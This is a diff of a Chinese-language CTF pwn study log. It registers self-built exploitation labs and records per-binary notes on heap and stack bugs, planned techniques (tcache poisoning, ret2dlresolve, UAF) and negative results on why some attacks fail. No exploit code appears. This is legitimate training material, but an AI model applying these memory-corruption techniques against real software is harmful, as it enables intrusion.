+| （无原始附件，自造） | `labs/lab_ret2dlresolve_i386/`：`src/chal.S`、`Makefile`、`chal`、`exp.py`、`libc/`（2.24 i386）、`README.md` |
 | 自造实验（无外部来源） | `labs/lab_srop_baby/`（`src/chal.S` + `Makefile` + `exp.py` + `README.md`） |
+| （无原始附件，自造） | `labs/lab_tcache_poisoning/`：`src/chal.c`、`Makefile`、`chal`、`exp.py`、`README.md`（L4，目标 `.bss` 函数指针，glibc 2.43） |
+| （无原始附件，自造） | `labs/lab_canary_bruteforce/`：`src/chal.c`、`Makefile`、`chal`、`exp.py`、`README.md`（L5，程序自带 fork server） |
+| （无原始附件，自造） | `labs/lab_heap_uaf/`：`src/chal.c`、`Makefile`、`chal`、`exp.py`、`README.md`（L6，函数指针 UAF） |
 
 命名规则：
 
@@ -1169,4 +1513,19 @@ handler      @0x40116c：
 
 > 以上条目均按“20 分钟规则”降级：先保证已解题目归档完整，再回头做。
 > 2026-11-23 状态：5.3 / 5.4 / card 已完成；只剩 `judgement_mna_2016`（5.2）与 `publibc/bf`。
+
+### 5.6 2026-11-24 新登记（`_vendor/` 剩余附件 + ret2dlresolve 负结果）
+
+| 二进制 | 保护 / 形态 | 已知信息 | 结论 / 阻塞点 |
+| --- | --- | --- | --- |
+| `_vendor/tcache_tear` | 64 位、Full RELRO、Canary、NX、No PIE；菜单 add/free/info | `add(size<=0xff)` 后 `readn(chunk, size-0x10)`，`size<0x10` 时长度变成 `size-0x10` 的 32 位负数（**巨量堆写**）；`free` 后不清指针（最多 8 次）；`info` 只回显固定 `.bss` 的 0x20 字节 `name` | **无任何地址泄漏**（分配上限 0xff，进不了 unsorted bin；`.bss` 不邻接堆）→ 需要先绕 tcache double-free key 再把 fd 部分覆盖成 `main_arena` 方向，收益与稳定性都不确定。按 20 分钟规则降级 |
+| `_vendor/death_note` | 32 位、EXECSTACK、No PIE；堆 note 管理 | 需要 i386 2.24/2.23（无 tcache）；典型解法是 UAF + shellcode / `__malloc_hook` | 未展开，待做 |
+| pwnable.tw `unexploitable`（外部下载，未入库） | 64 位、No PIE、NX，`read` 栈溢出但**没有可用的 `syscall` gadget** | 试图用 ret2dlresolve 绕过“无 syscall”：手工铺 `Elf64_Rela`/`Elf64_Sym`/字符串 + CSU 两段式 + `leave;ret` 换栈 + `plt0` 重定位，链路本身已跑到 `_dl_fixup` 内部；但 glibc ≥ 2.31 的 version lookup 会用未受控的 `sym index` 去读 `DT_VERSYM`（实测 `0x42af42` 未映射）→ `SIGSEGV` | **负结果：ret2dlresolve 在 amd64 + 现代 glibc 上不可用**（2.24 / 2.27 / 2.43 三个 loader 均复现）。**2026-11-24 补充**：同样思路在 **i386 小二进制 + glibc 2.24** 上可稳定成功（见 §3.L3 / `labs/lab_ret2dlresolve_i386`），原因是越界的 `versym[symidx]` 仍落在已映射的 `.bss`/`.data` 上读到 0 |
+
+### 5.7 2026-11-25 新登记（`hacknote` 负结果 + `card` 本地复现缺陷）
+
+| 对象 | 保护 / 形态 | 已知信息 | 结论 / 阻塞点 |
+| --- | --- | --- | --- |
+| pwnable.tw `hacknote`（`/tmp/newchal/hacknote`，未入库） | i386、Partial RELRO、Canary、NX、No PIE；菜单 add/delete/print，`notelist[5]` 在 `0x804a050`，`note = {fn, content}` | 反汇编（`0x80488a5` 的 print 分支）确认调用约定是 **`fn(note)`**：`mov eax,[notelist[i]]` 取 `fn`，`push edx` 推的是 **note 指针本身**；随后 `print_note_content` 做的事是 `puts(note->content)`。所以把 `fn` 改成 `system` 只能得到 `system(note)`，命令串的第一个 4 字节必然是被覆盖上的 `&system`，拿不到 content 里的 `"/bin/sh"`。真正可行的路子需要 heap 泄漏后做 fastbin 攻击（2.24 无 tcache），链路明显超出 20 分钟预算 | **负结果：本二进制上“改 `print_note_content` 为 `system` + content 放 `/bin/sh`”的通用解法不成立**（那是 `fn(content)` 语义的版本）。按 20 分钟规则降级，改由 `labs/lab_heap_uaf`（§3.L6）补 `heap_uaf` 第二题 |
+| `heap_exploitation/card`（题 26） | 64 位、2.27；`cards[]` 上限 8 | 本机 `/tmp/libc227` 是**扁平布局**（`ld-2.27.so` + `libc-2.27.so`），原先 `verify_all.sh` 只探 `root/lib/x86_64-linux-gnu/`，所以一直是 SKIP。现已能启动（`--library-path /tmp/libc227`），但 stage-1 的挡板 `create(8)` 在该二进制上无效（索引上限 8）→ S7 直接并进 top，unsorted bin 泄漏拿不到 `main_arena` | **已知缺陷，保持 SKIP**：`verify_all.sh` 用 `CARD227_LEAK_OK=1` 显式开关控制；修好 stage-1 布局后再打开。详见 `heap_exploitation/26_card_speedrun.md` §9 |
 
